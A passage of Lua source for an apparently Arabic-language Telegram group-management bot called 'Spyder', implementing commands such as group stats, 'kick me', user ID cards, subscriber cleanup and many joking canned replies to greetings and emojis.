tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local zain = '⌔︙ عدد الادمنيه : '..data.administrator_count_..
'\n\n⌔︙ عدد المطرودين : '..data.kicked_count_..
'\n\n⌔︙ عدد الاعضاء : '..data.member_count_..
'\n\n⌔︙ عدد رسائل الكروب : '..(msg.id_/2097152/0.5)..
'\n\n⌔︙ اسم المجموعه : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, zain) 
end,nil)
end,nil)
end 
----------------------------------------------------------------------------
if text == 'اطردني' or text == 'طردني' then
if not redis:get('Spyder:'..bot_id..'Cick:Me'..msg.chat_id_) then
if GetZanCan(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⌔︙ عذرا لا يمكنني طرد ( '..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'⌔︙ ليس لدي صلاحية حظر العضوين يرجى تفعيلها !') 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_, msg.id_,'⌔︙ عذرا لا يمكنني طرد ادمنية المجموعه') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(msg.chat_id_, msg.id_,'⌔︙ تم طردك من المجموعه ') 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,'⌔︙ امر اطردني تم تعطيله من قبل المدراء ') 
end
end
----------------------------------------------------------------------------
if text and text:match("^صيح (.*)$") then
local username = text:match("^صيح (.*)$") 
if not redis:get('Spyder:'..bot_id..'Seh:User'..msg.chat_id_) then
function start_function(extra, result, success)
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_,'⌔︙ المعرف خطأ ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,'⌔︙ لا اسطيع صيح معرفات القنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,'⌔︙ لا اسطيع صيح معرفات البوتات') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'⌔︙ لا اسطيع صيح معرفات المجموعات') 
return false  
end
if result.id_ then
send(msg.chat_id_, msg.id_,'⌔︙ تعال حبي يصيحونك بل كروب [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,'⌔︙ امر صيح تم تعطيله من قبل المدراء ') 
end
return false
end
----------------------------------------------------------------------------
if text == 'منو ضافني' then
if not redis:get('Spyder:'..bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,'⌔︙ انت منشئ المجموعه ') 
return false
end
local Added_Me = redis:get('Spyder:'..bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '⌔︙ الشخص الذي قام باضافتك هو ↫ '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,'⌔︙ انت دخلت عبر الرابط') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,'⌔︙ امر منو ضافني تم تعطيله من قبل المدراء ') 
end
end
----------------------------------------------------------------------------
if text == 'تفعيل ضافني' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل ضافني')
redis:del('Spyder:'..bot_id..'Added:Me'..msg.chat_id_)
end
if text == 'تعطيل ضافني' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل ضافني')
redis:set('Spyder:'..bot_id..'Added:Me'..msg.chat_id_, true)
end
----------------------------------------------------------------------------
if text == 'تفعيل صيح' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل صيح')
redis:del('Spyder:'..bot_id..'Seh:User'..msg.chat_id_)
end
if text == 'تعطيل صيح' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل صيح')
redis:set('Spyder:'..bot_id..'Seh:User'..msg.chat_id_, true)
end
----------------------------------------------------------------------------
if text == 'تفعيل اطردني' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل اطردني')
redis:del('Spyder:'..bot_id..'Cick:Me'..msg.chat_id_)
end
if text == 'تعطيل اطردني' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل اطردني')
redis:set('Spyder:'..bot_id..'Cick:Me'..msg.chat_id_, true)
end
-------------------------------------------------------------------
if text == ("ايدي") and msg.reply_to_message_id_ == 0 and not redis:get('Spyder:'..bot_id..'lock:id'..msg.chat_id_) then      
if not redis:sismember('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
redis:sadd('Spyder:'..bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,zain,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
elseif da.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
local Msguser = tonumber(redis:get('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local Contact = tonumber(redis:get('Spyder:'..bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
local NUMPGAME = tonumber(redis:get('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0)
local rtp = Get_Rutba(msg.sender_user_id_,msg.chat_id_)
local username = '@'..(result.username_ or 'لا يوجد')
local iduser = msg.sender_user_id_
local edit = tonumber(redis:get('Spyder:'..bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
local photps = (zain.total_count_ or 0)
local interaction = Total_Msg(Msguser)
local rtpg = rtpa
local zaina = {
"ياحلو مين الله جابك🤧",
"من شافك الگلب صاح فيش🙊😻",
"نورك عماني 🤭😹",
"منور ضلعي ♥️😌",
"غير صورتك 😪",
"تخليني♥️",
"طالع حلو ^_^",
"ليش مغير صورتك 🤣",
"منور 😚",
}
local rdphoto = zaina[math.random(#zaina)]
if not redis:get('Spyder:'..bot_id..'lock:id:Photo'..msg.chat_id_) then      
local get_id_text = redis:get('Spyder:'..bot_id.."ALALMY:ID"..msg.chat_id_)
if get_id_text then
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then   
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, zain.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'['..get_id_text..']\n🚫| لا يمكنني عرض صورتك لانك قمت بحظر البوت')   
else
send(msg.chat_id_, msg.id_, '\n⌔︙ ليس لديك صور في حسابك \n['..get_id_text..']')      
end 
end
else
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, zain.photos_[0].sizes_[1].photo_.persistent_id_,'⌔︙ '..rdphoto..'\n⌔︙ ايديك ↫ ('..msg.sender_user_id_..')\n⌔︙ معرفك ↫ '..username..'\n⌔︙ موقعك ↫ '..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⌔︙ صورك ↫ '..photps..'\n⌔︙ تفاعلك ↫ '..Total_Msg(Msguser)..'\n⌔︙ رسائلك ↫ {'..Msguser..'}\n⌔︙ سحكاتك ↫ {'..edit..'}\n⌔︙ نقاطك ↫ {'..NUMPGAME..'}\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉')   
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n⌔︙ ايديك ↫ ('..msg.sender_user_id_..')\n⌔︙ معرفك ↫ '..username..'\n⌔︙ موقعك ↫ '..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⌔︙ صورك ↫ '..photps..'\n⌔︙ تفاعلك ↫ '..Total_Msg(Msguser)..'\n⌔︙ رسائلك ↫ {'..Msguser..'}\n⌔︙ سحكاتك ↫ {'..edit..']}\n⌔︙ نقاطك ↫ {'..NUMPGAME..'}\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉')   
else
send(msg.chat_id_, msg.id_,'\n⌔︙ ليس لديك صور في حسابك'..'[\n⌔︙ ايديك ↫ ('..msg.sender_user_id_..')\n⌔︙ معرفك ↫ '..username..'\n⌔︙موقعك ↫ '..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⌔︙ صورك ↫ '..photps..'\n⌔︙ تفاعلك ↫ '..Total_Msg(Msguser)..'\n⌔︙ رسائلك ↫ {'..Msguser..'}\n⌔︙ سحكاتك ↫ {'..edit..']}\n⌔︙ نقاطك ↫ {'..NUMPGAME..'}\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉')    
end 
end
end
else
local get_id_text = redis:get('Spyder:'..bot_id.."ALALMY:ID"..msg.chat_id_)
if get_id_text then
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_,'[\n⌔︙ ايديك ↫ ('..msg.sender_user_id_..')\n⌔︙ معرفك ↫ '..username..'\n⌔︙ موقعك ↫ '..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'\n⌔︙ صورك ↫ '..photps..'\n⌔︙ تفاعلك ↫ '..Total_Msg(Msguser)..'\n⌔︙ رسائلك ↫ {'..Msguser..'}\n⌔︙ سحكاتك ↫ {'..edit..']}\n⌔︙ نقاطك ↫ {'..NUMPGAME..'}\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉')   
end
end

end,nil)
end,nil)
end,nil)
end,nil)
end
end
----------------------------------------------------------------------------
if text == 'سحكاتي' or text == 'تعديلاتي' then 
local Num = tonumber(redis:get('Spyder:'..bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
if Num == 0 then 
Text = '⌔︙ لم تقم بالسحك في الكتابه ليست لديك سحكات'
else
Text = '⌔︙ عدد سحكاتك *↫ { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
----------------------------------------------------------------------------
if text == "مسح سحكاتي" or text == "حذف سحكاتي" then  
send(msg.chat_id_, msg.id_,'⌔︙ تم مسح سحكاتك'  )  
redis:del('Spyder:'..bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
----------------------------------------------------------------------------
if text == "مسح جهاتي" or text == "حذف جهاتي" then  
send(msg.chat_id_, msg.id_,'⌔︙ تم مسح جهاتك'  )  
redis:del('Spyder:'..bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_)
end
----------------------------------------------------------------------------
if text == 'جهاتي' or text == 'شكد ضفت' then 
local Num = tonumber(redis:get('Spyder:'..bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
if Num == 0 then 
Text = '⌔︙ لم تقم بااضافة اي احد'
else
Text = '⌔︙ عدد جهاتك *↫ { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
----------------------------------------------------------------------------
if text == "تنظيف المشتركين" and Sudo_id(msg) then
local pv = redis:smembers('Spyder:'..bot_id..'Users:ids')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
redis:srem('Spyder:'..bot_id..'Users:ids',pv[i])  
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'⌔︙لا يوجد مشتركين وهميين')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'⌔︙عدد المشتركين الان ↫{ '..#pv..' }\n⌔︙تم العثور على ↫{ '..sendok..' } مشترك قام بحظر البوت\n⌔︙اصبح عدد المشتركين الان ↫{ '..ok..' } مشترك')   
end
end
end,nil)
end,nil)
end
return false
end
----------------------------------------------------------------------------
if text == "تنظيف المجموعات" and Sudo_id(msg) then
local group = redis:smembers('Spyder:'..bot_id..'Groups_Users')  
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
redis:srem('Spyder:'..bot_id..'Groups_Users',group[i])  
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
redis:srem('Spyder:'..bot_id..'Groups_Users',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
redis:srem('Spyder:'..bot_id..'Groups_Users',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
redis:srem('Spyder:'..bot_id..'Groups_Users',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'⌔︙لا توجد مجموعات وهميه ')   
else
local zain = (w + q)
local sendok = #group - zain
if q == 0 then
zain = ''
else
zain = '\n⌔︙ تم ازالة ~ '..q..' مجموعات من البوت'
end
if w == 0 then
Spyder = ''
else
Spyder = '\n⌔︙ تم ازالة ~'..w..' مجموعه لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'⌔︙ عدد المجموعات الان ↫ { '..#group..' } مجموعه '..Spyder..''..zain..'\n⌔︙اصبح عدد المجموعات الان ↫ { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
return false
end
-------------
if text == 'تفعيل الردود' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل الردود')
redis:del('Spyder:'..bot_id..'lock:add'..msg.chat_id_)
end
if text == 'تعطيل الردود' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل الردود')
redis:set('Spyder:'..bot_id..'lock:add'..msg.chat_id_, true)
end
-------------
if text == "السلام عليكم" or text == "سلام عليكم" or text == "سلام" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"وعليكم السلام والرحمه⇣😻","يمه هلا بالغالي 😻","وعليكم السلام حبيبي ☺️","كافي بس تسلمون 🌝💔" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-------------------------------
if text == "شلونك" or text == "شلونكم" or text == "شلونج" or text == "شونج" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"تمام وانت/ي 😘","شعليك انت 🧐😂","بخير انت/ي شلونك/ج ☺️","تمام وانت/ي ‏ ᵛ͢ᵎᵖ💛﴾" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
---------------------------
if text == "ممكن نزوج" or text == "ممكن نرتبط" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ها ها يمعودين احنه هنا😒😹","اعتقد اكو خاص وخطبو وهنا زفه بسيارتي🚗😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-----------------
if text == "🙊" or text == "🙈" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"اول مره اشوف قرد يستحي🤔😂","ما مرجيه منك هايه صاير تستحي انته هوايه 😍😂😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
--------
if text == "الخميس" or text == "خميس" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"وخرو وخرو🤓 هلا بلخميس تيرارا وياي يلا😍😹","هلا بلخميس عطله وكذا ركصو يلا😍😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-------
if text == "هلو" or text == "هاي" or text == "هلاو" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"هلووووات  ⁽🙆♂✨₎ֆ","يمه هلا بالعافيه 😻","لا هلا ولا مرحبه شلونك مشتاقين 😻😂","اخلاً وصخلا 😌😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-------
if text == "شنو هذا بوت" or text == "هذا بوت" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"عـٰٰـٰود لوتُٰي 🙀 يـٰگول بُِوت عبالـٰه طافٰـُٰي💔 ويضِٰل يمٰـٓسلت وينشٰٰر روابـٰٓط 😳","اي بوت شتريد ??" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
--------
if text == "غني" or text == "غنيلي" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"شكلولك عليه كاولي 😶😂","صوتي محلو للاسف 😌💔","اشعجـب كاطع بيه ياراحتي النفسيه 😂💔","حرام  الغنا 😐" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-------
if text == "باي" or text == "رايح" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"بايات 💛","گلعه 😶💔","الله الله الله وياك 😻😂","ثيمالا 🌝✋🏾" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
--------
if text == "جاو" or text == "ججاو" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"منو ال أجوو👀😹","جااااوات  ₎✿💥😈 ❥" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "نورت" or text == "منور" or text == "منوره" or text == "نورتي" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"نورك/ج هذا ورده 🌝","بوجودك/غلا تسلم 😻✨","انت/ي اصل النور 😋","عماني نورك 😣😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-----
if text == "بوسني" or text == "بوسه" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مووووووووواححح💋😘","مابوس ولي😌😹","خدك/ج نضيف 😂","البوسه بالف حمبي 🌝💋","خلي يزحفلي وابوسه 🙊😻","كل شويه ابوسه كافي 😏","ماابوسه والله هذا زاحف🦎","محح هاي لحاته صاكه💋"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "امك" or text == "امج" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"عيـــب 🙀😹","شبيه امك حمبي😋" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "خالتك" or text == "خالتج" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"شبيه الشكره ام الوصخ 🤭😹","حبيته فدوووه??","شرايد من خالته 🤭😂","خالته تفلش 😶😹" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "تف" or text == "تفف" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"تف عليك ادبسزز 😒😹","لا تتفل على وجهك 😻😹","ما اسمحلك هيلگ 😡😹","بدون تفال رجائاً 😹😹" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-----
if text == "😂" or text == "😂😂" or text == "😂😂😂😂" or text == "😂😂😂" or text == "😹😹" or text == "😹😹😹" or text == "😹" or text == "😹😹😹😹" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"كافـي ضحــك 😐","لتضحك هواي وتصير فاول 🌝😹","هذ شبي يضحك 🙀??","اضحك هيه الدنيا خربانه 😂😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "😡" or text == "😡😡" or text == "😡😡😡" or text == "😡😡😡😡" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"لصير عصبي يرتفع ضغطـك 😌😂","صار وجه احمر مثل الطماطه 🙊😹","اوف شحلاتك وانت ضايج 😻","شبي هذا الله يستر ??😹" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "😒" or text == "😒😒" or text == "😒😒😒" or text == "😒😒😒😒" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"لضوج متسوووه 🤭😹","يمه زعلان الحلو ما يكلي مرحبا 😻😹","اعدل وجهك لا اعدله الك/ج 😼👊🏼" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "🌝" or text == "🌝🌝" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"يمه الگمر عذبني حبه 🙊😻","عو نضيف الوصخ 😹😹","طفي ضواك عميتني 😼😹" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "💋" or text == "💋💋" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"كبر 🙀 جان استحيتو 😹😹","عســـل 😋🙊" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-----
if text == "💔" or text == "💔💔" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"شبي مكسور 😔💔","موجوع كلبي والتعب بيه 😔😹","اكل بصل وانسه الحصل 😻😹" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-----
if text == "😻" or text == "😻😻" or text == "😍😍" or text == "😍" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"شوفو الحب صاعد فول 😻😹","ها ناوي تزحف 😹😹","فدوووه لهاي العيون 🙊😻" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-----
if text == "😐" or text == "🙂" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"شبيك حبيبي 😂💔","منور محمد الاعمى 😐😹" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "جوعان" or text == "جوعانه" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"شطبخلك/ج  🙊😋" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "ههه" or text == "هههه" or text == "ههههه" or text == "هههههه" or text == "ههههههه" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"دووم الضحكه 🙊","دوم الضحكه ℡̮⇣┆👑😻⇣ۦ ٰ" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-------
if text == "اكلك" or text == "اكلج" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"اي غرد/ي دا اسمع 👂🏽😹","كول😹 (كول لو هدف)??😹","ها حياتي 🙊" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "شبيك" or text == "شبيك انت" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"انت/ي شبيك/ج😣","مابيه شي تسلم 💋😹" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "🌚💔" or text == "💔" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"هم اجانه محترك وجه😂♥️","هاي منو كاسر كلبك😡","اهو هم اجانه صخام🐸👌" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "فديتك" or text == "فديتج" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ها بدت حبجيه ✨😂","لتلح عود يعني احبج🙈😹","كافي درينه مشتاقله 😒" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
------
if text == "😢" or text == "😢😢" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"يبجي دلوع😜??","هاي عود انت جبير كاعد تبجي😑💔","لتلح درينه تبجي😒"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-----
if text == "ميتين" or text == "اصنام" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"علساس انت متفاعل😒😒","اي عندك اعتراض🤔","اني معليه احرسكم😎" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-----
if text == "☺️" or text == "☺☺" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"عود اني حباب ونت شيطان يتعلم منك🙈😂😂","وجهك ميساعد🤢😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
-----
if text == "اجه" or text == "اجت" then
if not redis:get('Spyder:'..bot_id..'lock:add'..msg.chat_id_) then
local texting = {"اهو لا هلا بيه ✨😂","خي ولي مزاعله ✨😂","اهلا بيه بس اطرده اذا اجه😒😂" }
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
----------------------------------------------------------------------------
if text == 'سمايلات' or text == 'سمايل' then
if redis:get('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_) then
redis:del('Spyder:'..bot_id..'Set:Sma'..msg.chat_id_)
